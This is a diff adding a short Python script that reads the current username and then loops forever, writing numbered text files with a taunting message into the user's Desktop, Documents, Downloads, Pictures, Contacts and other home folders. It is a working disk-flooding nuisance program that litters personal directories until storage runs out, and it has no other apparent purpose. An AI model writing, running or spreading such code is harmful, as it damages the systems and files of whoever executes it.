@@ -1,0 +1,30 @@
+import getpass
+getpass.getuser()
+number = 0
+while 0 == 0:
+    up = number + 1
+    number = up + 1
+    createFile = open('/Users/' + getpass.getuser() + '/Desktop/' + str(up) + '.txt', 'w+')
+    createFile.write("HA-HA, You're dumb for not watching out for people like us.")
+    createFile = open('/Users/' + getpass.getuser() + '/Documents/' + str(up) + '.txt', 'w+')
+    createFile.write("HA-HA, You're dumb for not watching out for people like us.")
+    createFile = open('/Users/' + getpass.getuser() + '/.idlerc/' + str(up) + '.txt', 'w+')
+    createFile.write("HA-HA, You're dumb for not watching out for people like us.")
+    createFile = open('/Users/' + getpass.getuser() + '/Contacts/' + str(up) + '.txt', 'w+')
+    createFile.write("HA-HA, You're dumb for not watching out for people like us.")
+    createFile = open('/Users/' + getpass.getuser() + '/Downloads/' + str(up) + '.txt', 'w+')
+    createFile.write("HA-HA, You're dumb for not watching out for people like us.")
+    createFile = open('/Users/' + getpass.getuser() + '/Favorites/' + str(up) + '.txt', 'w+')
+    createFile.write("HA-HA, You're dumb for not watching out for people like us.")
+    createFile = open('/Users/' + getpass.getuser() + '/Links/' + str(up) + '.txt', 'w+')
+    createFile.write("HA-HA, You're dumb for not watching out for people like us.")
+    createFile = open('/Users/' + getpass.getuser() + '/Music/' + str(up) + '.txt', 'w+')
+    createFile.write("HA-HA, You're dumb for not watching out for people like us.")
+    createFile = open('/Users/' + getpass.getuser() + '/Pictures/' + str(up) + '.txt', 'w+')
+    createFile.write("HA-HA, You're dumb for not watching out for people like us.")
+    createFile = open('/Users/' + getpass.getuser() + '/Videos/' + str(up) + '.txt', 'w+')
+    createFile.write("HA-HA, You're dumb for not watching out for people like us.")
+    createFile = open('/Users/' + getpass.getuser() + '/Saved Games/' + str(up) + '.txt', 'w+')
+    createFile.write("HA-HA, You're dumb for not watching out for people like us.")
+    createFile = open('/Users/' + getpass.getuser() + '/Searches/' + str(up) + '.txt', 'w+')
+    createFile.write("HA-HA, You're dumb for not watching out for people like us.")
